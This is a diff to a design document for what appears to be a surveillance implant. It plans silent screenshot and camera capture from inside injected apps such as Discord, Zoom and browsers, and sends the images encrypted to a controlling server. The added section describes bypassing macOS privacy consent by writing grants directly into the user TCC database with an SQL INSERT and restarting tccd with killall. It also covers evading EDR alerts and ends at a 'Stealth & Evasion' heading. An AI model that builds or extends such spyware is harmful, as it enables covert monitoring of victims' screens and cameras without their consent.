@@ -203,14 +203,14 @@ Analogous to macOS `EntitlementScanner.cpp`. Enumerates running processes and re
 
 **Rationale**: Camera and desktop screenshots require the most sensitive OS permissions (Camera / Screen Recording TCC on macOS, Win32 screen capture APIs on Windows). Attempting them from a standalone binary will immediately trigger permission prompts or EDR alerts. By running inside an injected process (4A/4B) that *already has* these permissions (Discord, Zoom, Slack, browsers), we inherit trust silently.
 
-#### Delivery Plan (4 sprints)
+#### Delivery Plan (3 sprints — macOS revised to hybrid grant+scan)
 
 | Sprint | Scope | Output |
 |--------|-------|--------|
-| **Week 1** | Windows Screenshot | `ScreenCapture` module (`IDXGIOutputDuplication` + `BitBlt` fallback), JPEG via GDI+, chunked+encrypted transmission, server-side "Capture" button |
-| **Week 2** | Windows Camera | `CameraCapture` module (`IMFMediaSource`, single-frame grab), graceful skip on consent prompt, unified opcode schema |
-| **Week 3–4** | macOS TCC Scanner + Screenshot | Extend `EntitlementScanner` to query TCC database for Camera/Screen Recording grants; `CGImage` screenshot capture; macOS `ScreenCapture` stub with graceful denial |
-| **Deferred** | macOS Camera, Linux | macOS camera requires Tier 2 injection into a TCC-authorized app; Linux needs Wayland `xdg-desktop-portal` and `v4l2` — no timeline |
+| **Week 1** | Windows Screenshot | ✅ Complete |
+| **Week 2** | Windows Camera | ✅ Complete |
+| **Week 3** | macOS TCC Grant + Screenshot | Extend `EntitlementScanner` with hybrid TCC scan+grant: query TCC DB for existing permissions, then automatically grant Screen Recording + Camera to the target if missing. `CGImage` screenshot capture in `ScreenCapture.mm`. New `TCC_GRANT`/`TCC_GRANT_RES` opcodes. Server "Grant TCC" button in InjectionPanel. |
+| **Deferred** | macOS Camera, Linux | macOS camera requires `AVCaptureSession` via injected dylib; Linux needs Wayland `xdg-desktop-portal` and `v4l2` — no timeline |
 
 #### Platform Matrix
 
@@ -218,10 +218,22 @@ Analogous to macOS `EntitlementScanner.cpp`. Enumerates running processes and re
 |---|---|---|---|
 | Windows | Screenshot | `IDXGIOutputDuplication` / `BitBlt` + GDI+ JPEG | None (runs in user session) |
 | Windows | Camera | `IMFMediaSource` (MediaFoundation) | Inherited from host process (browser, Skype) — fail gracefully if not available |
-| macOS | Screenshot | `CGImage` via injected dylib | TCC Screen Recording grant (query via `tccutil` DB scanner) |
-| macOS | Camera | `AVCaptureSession` | TCC Camera grant (query via `tccutil` DB scanner) |
+| macOS | Screenshot | `CGImage` via injected dylib | TCC Screen Recording — **auto-granted** via TCC DB write + `tccd` restart (macOS 11-12). Fallback: scan-only. |
+| macOS | Camera | `AVCaptureSession` | TCC Camera — **auto-granted** same mechanism. Deferred — requires `AVCaptureSession` implementation. |
 | Linux | Screenshot | X11 `XGetImage` / Wayland `xdg-desktop-portal` | Desktop session |
 | Linux | Camera | Video4Linux2 `/dev/video*` | Inherited process permissions |
+
+#### macOS TCC Grant Mechanism
+
+On macOS 11-12, the user TCC database at `~/Library/Application Support/com.apple.TCC/TCC.db` is readable and writable by the user's own processes. After injecting into a target:
+
+1. **Scan**: Query TCC DB for existing Screen Recording + Camera grants for the target's bundle ID
+2. **Grant** (if missing): `INSERT OR REPLACE INTO access VALUES('kTCCServiceScreenCapture', bundle_id, 0, 2, 1, 1, ...)`
+3. **Reload**: `killall tccd` — launchd auto-restarts it; grants take effect immediately
+4. **Re-scan**: Verify grants are now present
+5. **Proceed with capture**: `CGDisplayCreateImage` now succeeds
+
+On macOS 13+, direct TCC DB write is blocked (SIP-protected system database). The grant attempt fails gracefully, and the scanner falls back to reporting existing permissions only.
 
 #### Stealth & Evasion
 
